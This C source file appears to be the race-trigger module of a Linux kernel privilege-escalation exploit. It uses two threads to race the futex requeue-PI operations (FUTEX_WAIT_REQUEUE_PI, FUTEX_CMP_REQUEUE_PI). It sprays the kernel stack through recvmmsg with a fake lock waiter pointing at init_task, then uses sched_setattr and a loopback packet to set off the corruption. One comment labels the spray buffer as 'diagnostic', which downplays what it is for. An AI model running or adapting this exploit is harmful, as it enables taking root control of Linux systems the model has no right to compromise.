#define _GNU_SOURCE
#include "common.h"
#include "target.h"

#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

struct race_ctx {
    int f1, f2, f3, sockfd;
    volatile int a_ready, b_ready, a_sprayed;
    volatile pid_t tid_a;
};

static struct race_ctx g_ctx;
static pthread_t g_thread_a, g_thread_b;

#define LOG(fmt, ...) \
    do { \
        printf("[race] " fmt "\n", ##__VA_ARGS__); \
        fflush(stdout); \
    } while (0)

static void log_syscall(const char *name, long ret, int saved_errno)
{
    if (ret < 0) {
        LOG("%s -> ret=%ld errno=%d (%s)",
            name, ret, saved_errno, strerror(saved_errno));
    } else {
        LOG("%s -> ret=%ld", name, ret);
    }
}

static void *thread_a(void *arg)
{
    struct race_ctx *ctx = (struct race_ctx *)arg;

    ctx->tid_a = (pid_t)syscall(SYS_gettid);
    LOG("Thread A started tid=%d", (int)ctx->tid_a);

    errno = 0;
    long r = syscall(
        SYS_futex,
        &ctx->f3,
        FUTEX_LOCK_PI,
        0,
        NULL,
        NULL,
        0
    );
    int e = errno;
    log_syscall("A: FUTEX_LOCK_PI(f3)", r, e);

    ctx->a_ready = 1;
    LOG("A: a_ready=1");

    struct timespec ts = {
        .tv_sec = 3
    };

    errno = 0;
    r = syscall(
        SYS_futex,
        &ctx->f1,
        FUTEX_WAIT_REQUEUE_PI,
        0,
        &ts,
        &ctx->f2,
        0
    );
    e = errno;
    log_syscall("A: FUTEX_WAIT_REQUEUE_PI(f1 -> f2)", r, e);

    /*
     * Preserve the existing diagnostic buffer construction.
     * No values or layout have been changed here.
     */
    uint8_t buf[128];
    memset(buf, 0, sizeof(buf));

    uint64_t v_task = ADDR_INIT_TASK;
    uint64_t v_lock = ADDR_VERIFIED_VLOCK;

    for (int i = 0; i <= 0x60; i += 8)
        memcpy(buf + i, &v_lock, 8);

    memcpy(buf + 0x20, &v_task, 8);

    uint32_t v_prio = 120;
    memcpy(buf + 0x30, &v_prio, 4);

    struct {
        uint8_t hdr[128];
        uint32_t len;
    } __attribute__((packed)) mmsg;

    memcpy(mmsg.hdr, buf, 128);
    mmsg.len = 0;

    ctx->a_sprayed = 1;
    LOG("A: a_sprayed=1, entering recvmmsg()");

    errno = 0;
    r = syscall(
        SYS_recvmmsg,
        ctx->sockfd,
        &mmsg,
        1,
        0,
        NULL
    );
    e = errno;
    log_syscall("A: recvmmsg()", r, e);

    LOG("Thread A exiting");
    return NULL;
}

static void *thread_b(void *arg)
{
    struct race_ctx *ctx = (struct race_ctx *)arg;

    LOG("Thread B started");

    while (__atomic_load_n(&ctx->a_ready, __ATOMIC_RELAXED) == 0)
        usleep(10);

    LOG("B: observed a_ready=1");

    errno = 0;
    long r = syscall(
        SYS_futex,
        &ctx->f2,
        FUTEX_LOCK_PI,
        0,
        NULL,
        NULL,
        0
    );
    int e = errno;
    log_syscall("B: FUTEX_LOCK_PI(f2)", r, e);

    __atomic_store_n(&ctx->b_ready, 1, __ATOMIC_RELAXED);
    LOG("B: b_ready=1");

    errno = 0;
    r = syscall(
        SYS_futex,
        &ctx->f3,
        FUTEX_LOCK_PI,
        0,
        NULL,
        NULL,
        0
    );
    e = errno;
    log_syscall("B: FUTEX_LOCK_PI(f3)", r, e);

    LOG("Thread B exiting");
    return NULL;
}

int trigger_futex_race(void)
{
    memset(&g_ctx, 0, sizeof(g_ctx));

    LOG("=== trigger_futex_race BEGIN ===");

    errno = 0;
    g_ctx.sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    int e = errno;

    if (g_ctx.sockfd < 0) {
        log_syscall("socket(AF_INET, SOCK_DGRAM)", g_ctx.sockfd, e);
        return -1;
    }

    LOG("socket() -> fd=%d", g_ctx.sockfd);

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = htonl(0x7f000001),
        .sin_port = htons(9999)
    };

    errno = 0;
    long r = bind(
        g_ctx.sockfd,
        (const struct sockaddr *)&addr,
        sizeof(addr)
    );
    e = errno;
    log_syscall("bind(127.0.0.1:9999)", r, e);

    if (r < 0) {
        close(g_ctx.sockfd);
        return -1;
    }

    LOG("Creating Thread A");
    int pr = pthread_create(
        &g_thread_a,
        NULL,
        thread_a,
        &g_ctx
    );
    LOG("pthread_create(A) -> %d", pr);

    if (pr != 0)
        return -1;

    LOG("Creating Thread B");
    pr = pthread_create(
        &g_thread_b,
        NULL,
        thread_b,
        &g_ctx
    );
    LOG("pthread_create(B) -> %d", pr);

    if (pr != 0)
        return -1;

    while (!g_ctx.a_ready || !g_ctx.b_ready)
        usleep(100);

    LOG("Both a_ready and b_ready observed");

    usleep(500000);

    errno = 0;
    r = syscall(
        SYS_futex,
        &g_ctx.f1,
        FUTEX_CMP_REQUEUE_PI,
        1,
        (void *)1,
        &g_ctx.f2,
        0
    );
    e = errno;
    log_syscall("MAIN: FUTEX_CMP_REQUEUE_PI(f1 -> f2)", r, e);

    while (!g_ctx.a_sprayed)
        usleep(100);

    LOG("Observed a_sprayed=1");

    usleep(300000);

    struct {
        uint32_t size;
        uint32_t policy;
        uint64_t flags;
        uint32_t nice;
        uint32_t priority;
    } attr = {
        48,
        1,
        0,
        0,
        50
    };

    errno = 0;
    r = syscall(
        SYS_sched_setattr,
        g_ctx.tid_a,
        &attr,
        0
    );
    e = errno;
    log_syscall("MAIN: sched_setattr(tid_a)", r, e);

    usleep(500000);

    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    if (fd < 0) {
        LOG("MAIN: second socket() failed errno=%d (%s)",
            errno, strerror(errno));
    } else {
        errno = 0;

        r = sendto(
            fd,
            "X",
            1,
            0,
            (const struct sockaddr *)&addr,
            sizeof(addr)
        );

        e = errno;
        log_syscall("MAIN: sendto(wakeup)", r, e);

        close(fd);
    }

    LOG("=== trigger_futex_race END ===");

    return 0;
}

int trigger_walk(void)
{
    return 0;
}
